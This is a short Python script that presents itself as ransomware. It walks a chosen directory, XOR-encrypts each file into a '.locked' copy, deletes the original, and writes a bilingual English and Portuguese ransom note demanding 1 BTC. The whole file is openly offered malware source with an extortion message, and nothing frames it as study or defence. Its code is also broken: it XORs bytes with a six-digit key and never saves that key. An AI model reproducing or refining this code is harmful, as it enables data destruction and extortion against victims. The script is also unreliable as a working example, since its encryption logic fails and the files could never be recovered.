import os
import random


def encrypt_file(file_path):
    key = str(random.randint(100000, 999999))
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted_data = bytes([d ^ int(key) for d in data])
    with open(file_path + ".locked", "wb") as file:
        file.write(encrypted_data)
    os.remove(file_path)


def encrypt_directory(directory_path):
    for dirpath, _, filenames in os.walk(directory_path):
        for filename in filenames:
            file_path = os.path.join(dirpath, filename)
            encrypt_file(file_path)


def ransom_note():
    return """
    ----------------------------
    YOUR FILES ARE ENCRYPTED!
    ----------------------------
    
    To get your files back, please send 1 BTC to this address: [INSERT ADDRESS HERE]
    After you send the payment, send an email to [INSERT EMAIL HERE] with your Bitcoin wallet ID and your unique key: [INSERT KEY HERE].
    You will receive a decryption tool that will restore your files.
    
    WARNING: Do not try to decrypt the files on your own or you will risk losing them forever.

    ----------------------------
    SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!
    ----------------------------

    Para recebe-los devolta, envie o valor de 1 BTC neste endereço: 
    Efetuado o pagamento, envie um email para [email] com sua Bitcoin Wallet ID e sua chave unica [key].
    Você receberá uma ferramenta de descriptografia que restaurará seus arquivos.
    
    AVISO: Não tente descriptografar os arquivos por conta própria ou correrá o risco de perde-los para sempre.
    """


def create_ransom_note_file(directory_path):
    with open(os.path.join(directory_path, "READ_ME.txt"), "w") as file:
        file.write(ransom_note())


if __name__ == "__main__":
    target_directory = input("ransonware.py")
    encrypt_directory(target_directory)
    create_ransom_note_file(target_directory)
    print("Encriptação completa. Os arquivos foram encriptados e o read do ransom foi criado!.")
